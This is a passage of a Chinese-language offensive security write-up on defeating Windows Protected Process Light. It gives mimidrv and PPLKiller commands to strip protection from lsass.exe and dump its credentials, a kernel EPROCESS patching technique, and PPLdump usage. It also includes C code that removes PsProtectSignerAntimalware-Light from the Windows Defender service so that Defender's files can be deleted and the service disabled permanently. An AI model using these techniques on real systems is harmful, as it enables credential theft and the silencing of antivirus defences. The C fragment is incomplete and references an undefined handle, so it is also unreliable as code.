    [+] 'mimidrv' service ACL to everyone
    [+] 'mimidrv' service started
使用命令!processprotect删除保护
同时我们在进程中也是可以访问到lsass.exe的句柄
dump
lsass.exe密码
# 通过修补 EPROCESS 内核结构禁用 LSASS 进程上的 PPL 标志
>  light-without-mimikatz-on-windows-10/>
我们需要找到LSASS
EPROCESS结构的地址并将5个值修补：SignatureLevel、SectionSignatureLevel、Type、Audit和Signer为零
该EnumDeviceDrivers函数可用于泄漏内核基地址。这可用于定位指向系统进程的EPROCESS结构的PsInitialSystemProcess。由于内核将进程存储在链表中，因此可以使用EPROCESS结构的
ActiveProcessLinks成员来迭代链表并找到LSASS。
如果我们查看EPROCESS结构（参见下图），我们可以看到我们需要修补的5个字段都按惯例对齐成连续的4个字节。这让我们可以在单个4字节写入中修补EPROCESS结构，
如下所示：
WriteMemoryPrimitive(Device,4,CurrentProcessAddress+SignatureLevelOffset,
0x00);
那么可以移除PPL，然后就可以使用任何Dump LSASS方法，例如MimiKatz、MiniDumpWriteDump API调用等。
**POC：**
    PPLKiller version 0.3 by @aceb0nd  
    Usage: PPLKiller.exe  
    [/disablePPL ]  
    [/disableLSAProtection]  
    [/makeSYSTEM ]  
    [/makeSYSTEMcmd]  
    [/installDriver]  
    [/uninstallDriver]  
运行PPLKiller.exe /installDriver安装驱动程序；
进行攻击，PPLKiller.exe /disableLSAProtection；
PP(L) 模型有效地防止未受保护的进程使用OpenProcess例如扩展访问权限访问受保护的进程。
# 滥用 DefineDosDevice API
函数的原型：
    DefineDosDevice  
    BOOL DefineDosDeviceW(  
    DWORD   dwFlags,  
    LPCWSTR lpDeviceName,   
    LPCWSTR lpTargetPath  
    );  
    > DefineDosDevice  
    BOOL DefineDosDeviceW(  
    DWORD   dwFlags,  
    LPCWSTR lpDeviceName,  
    LPCWSTR lpTargetPath  
    );  
    https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-definedosdevicewhttps://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-definedosdevicew
可以定义、重新定义或删除 MS-DOS 设备名称。
具体利用分析手法：  
基本原理为：  
使用DefineDosDeviceAPI 函数来欺骗系统创建任意已知 DLL 条目。由于 PPL 不检查已知 DLL 的数字签名，因此以后可以使用它来执行
DLL 劫持攻击并在 PPL 中执行任意代码。
    c:\Users\qax\Desktop>PPLdump.exe
    _____ _____ __      _
    |  _  |  _  |  |   _| |_ _ _____ ___
    |   __|   __|  |__| . | | |     | . |  version 0.4
    |__|  |__|  |_____|___|___|_|_|_|  _|  by @itm4n                                                              |_|
    Description: 
    Dump the memory of a Protected Process Light (PPL) with a *userland* exploit
    Usage: 
    PPLdump.exe [-v] [-d] [-f]  
    Arguments: 
    PROC_NAME  The name of a Process to dump
    PROC_ID    The ID of a Process to dump 
    DUMP_FILE  The path of the output dump file
    Options: 
    -v         (Verbose) Enable verbose mode 
    -d         (Debug) Enable debug mode (implies verbose) 
    -f         (Force) Bypass DefineDosDevice error check
    Examples: 
    PPLdump.exe lsass.exe lsass.dmp
    PPLdump.exe -v 720 out.dmp
    dump lsass.exe
    .\PPLdump.exe -v lsass.exe lsass.dmp
# 攻击PPL的Antimalware
在微软文档中被称为Protecting Anti-Malware Services(保护反恶意软件服务)
要使反恶意软件用户模式服务作为受保护的服务运行，反恶意软件供应商必须在 Windows 计算机上安装 ELAM 驱动程序。除了现有的 ELAM
驱动程序认证要求外，驱动程序必须有一个嵌入的资源部分，其中包含用于签署用户模式服务二进制文件的证书信息。
在启动过程中，将从 ELAM 驱动程序中提取此资源部分以验证证书信息并注册反恶意软件服务。反恶意软件服务也可以在反恶意软件安装过程中通过调用特殊的 API
进行注册，如本文档后面所述。
从 ELAM
驱动程序成功提取资源部分并注册用户模式服务后，允许该服务作为受保护服务启动。服务作为受保护启动后，系统上的其他非受保护进程将无法注入线程，也不会允许它们写入受保护进程的虚拟内存。
此外，加载到受保护进程中的任何非 Windows DLL 都必须使用适当的证书进行签名。
为了能够作为PPL运行，反恶意软件供应商必须向 Microsoft 申请、证明其身份、签署具有约束力的法律文件、实施Early Launch Anti-Malware ( ELAM ) 驱动程序、通过测试套件运行并提交向 Microsoft 索取特殊的 Authenticode
签名。这不是一个简单的过程。此过程完成后，供应商可以使用此ELAM驱动程序让 Windows 通过将其作为PPL运行来保护其反恶意软件服务。
例如:
**Windows Defender**
**ESET Security**
即使以 SYSTEM（或提升的管理员）身份运行的用户SeDebugPrivilege 也无法终止PPL Windows Defender 反恶意软件服务 (
MsMpEng.exe)。这是因为非PPL进程 taskkill.exe无法使用诸如 OpenProcess之类的 API
获取具有对PPLPROCESS_TERMINATE进程的访问权限的句柄。
# 停止PPL保护破坏WDF
可以关闭Windows Defender服务并通过提升权限删除ppl保护，然后删除Windows Defender中的DLL和其他文件，使Windows
Defender服务无法运行，从而导致Windows Defender拒绝服务。
**1.将权限升级到trustedinstaller**
我们使用受信任的安装程序组令牌自动窃取系统令牌，以提升到受信任的安装程序权限，在这里，我们使用一个开源工具来利用它：
提权到TrustedInstaller并使用这个权限打开一个新的CMD.exe
同时这个cmd.exe也拥有TrustedInstaller权限。
**2.关闭Windows Defender服务**
这个其实并不是漏洞，因为我们的administrator权限也可以直接临时关闭Windows Defender服务。
但是这样关闭Windows Defender服务可以手工打开和重启会自动打开，我们想要的是永远关闭Windows
Defender服务，在黑客的想法中就是目标无论如何都没有办法再次启动Windows Defender服务，当然重装系统除外。哈哈哈....
**3.移除 PsProtectSignerAntimalware-Light 保护**
在微软文档中我们可以知道：
只要我们对服务对象有足够的访问权限，就可以更改服务保护。也就是说我们可以关闭Windows Defender服务的PPL。经过我们测试知道服务 ACL
根本不允许 SYSTEM 用户和管理员组修改或停止 Windows Defender 服务。但它允许 WinDefend 和
TrustedInstaller 修改或停止 Windows Defender 服务的ppl，那么上面我们拥有了完整的TrustedInstaller权限。
那么我们可以禁用Windows Defender 服务的PsProtectSignerAntimalware-Light，然后可以修改和删除Windows
Defender的运行必要组件来达到使永远关闭Windows Defender服务的目的。
Windows Defender的文件保存路径为：
    C:\Program Files\Windows Defender
    C:\Program Files\Windows Defender Advanced Threat Protection
    C:\Program Files (x86)\Windows Defender
在有PPL的情况下我们无法对这些文件进行任何修改。
同样在TrustedInstaller权限中也无法进行修改等等操作。
那么我们可以使用TrustedInstaller权限通过ChangeServiceConfig2W来停止PsProtectSignerAntimalware-Light 保护，然后修改和删除Windows Defender的运行必要组件来达到使永远关闭Windows Defender服务的目的。
    SC_HANDLE tt = OpenSCManager(NULL, NULL, GENERIC_READ);//建立服务控制管理器的连接     SC_HANDLE windefend_svc = OpenServiceW(tt, L"WinDefend", SERVICE_START | SERVICE_STOP | GENERIC_READ | SERVICE_CHANGE_CONFIG |   SERVICE_USER_DEFINED_CONTROL);  
      //打开一个已经存在的服务 打开wdf的服务  
      if (windefend_svc == NULL) {  
       printf("\n[-] Failed to open WinDefend service.");   
       return 1;  
    }  
      printf("Done.\n"); 
    SERVICE_STATUS svc_status; 
    if (!ControlService(windefend_svc, SERVICE_CONTROL_STOP, &svc_status)) {  
      //停止WDF服务   
      printf("[-] Failed to stop WinDefend service :(");   
      return 1;  
      } 
      printf("[+] Successfully sent service stop control.\n");  SERVICE_LAUNCH_PROTECTED_INFO info;  
      DWORD ret_sz = 0;
      QueryServiceConfig2W(windefend_svc, SERVICE_CONFIG_LAUNCH_PROTECTED, (LPBYTE)&info, sizeof(SERVICE_LAUNCH_PROTECTED_INFO), &ret_sz);  
      //检索WDF服务的可选配置参数。 
      if (info.dwLaunchProtected == SERVICE_LAUNCH_PROTECTED_NONE)  
      goto WaitDefender; 
      info.dwLaunchProtected = SERVICE_LAUNCH_PROTECTED_NONE; 
      if (!ChangeServiceConfig2W(windefend_svc, SERVICE_CONFIG_LAUNCH_PROTECTED, &info)) {  
      printf("[-] Failed to remove PsProtectSignerAntimalware-Light from WinDefend service :(");    return 1; 
      } 
      printf("[+] Successfully removed PsProtectSignerAntimalware-Light from WinDefend service.\n");
      WaitDefender:
      printf("[*] Waiting WinDefend to stop .!\n");  WaitForSingleObject(hwindefend, INFINITE); 
      CloseHandle(hwindefend); 